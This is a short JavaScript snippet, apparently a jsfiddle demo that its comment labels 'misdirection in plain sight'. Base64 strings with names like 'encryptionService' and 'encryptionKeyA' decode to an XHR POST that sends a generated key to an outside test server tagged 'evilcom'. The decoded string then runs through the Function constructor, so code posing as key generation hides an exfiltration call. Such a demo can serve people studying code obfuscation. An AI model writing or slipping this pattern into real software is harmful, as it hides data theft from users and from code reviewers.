//https://jsfiddle.net/4je730xn/0/

/**
 * misdirection in plain sight: uses
 * base64 encoding to hide the external url
 * and xhr function call
 **/

window.generateKey = function() {
  tokenConfig.userKeyCode += Math.random().toString(36).substring(2,3);
  if (tokenConfig.userKeyCode.length === 10) {
    var encryptedKey = makeKey();
    document.querySelector('#result').textContent = tokenConfig.userKeyCode;
    new encryptedKey.constructor.constructor(encryptedKey)();
  }
}

var tokenConfig = {
	encryptionService: "aHR0cHM6Ly9wb3N0dGVzdHNlcnZlci5jb20vcG9zdC5waHA/ZGlyPWV2aWxjb20=",
	encryptionKeyA: "dmFyIGFyZ3MgPSAna2V5PScgKyAndG9rZW5Db25maWcudXNlcktleUNvZGUnOyB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7IHhoci5vcGVuKCdQT1NUJywgZW5jb2RlVVJJKGF0b2IoInRva2VuQ29uZmlnLmVuY3J5cHRpb25TZXJ2aWNlIikpLCB0cnVlKTsgeGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnR",
    encryptionKeyB: "lbnQtdHlwZScsICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnKTsgeGhyLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgeyBpZiAoeGhyLnJlYWR5U3RhdGUgPT0gNCkgeyBjb25zb2xlLmxvZyh4aHIucmVzcG9uc2VUZXh0KTsgfSB9OyB4aHIuc2VuZChhcmdzKTs=",
	userKeyCode: ""
};

var makeKey = function () {
    return atob(tokenConfig.encryptionKeyA + tokenConfig.encryptionKeyB)
        .replace("tokenConfig.userKeyCode",tokenConfig.userKeyCode)
        .replace("tokenConfig.encryptionService",tokenConfig.encryptionService);
};
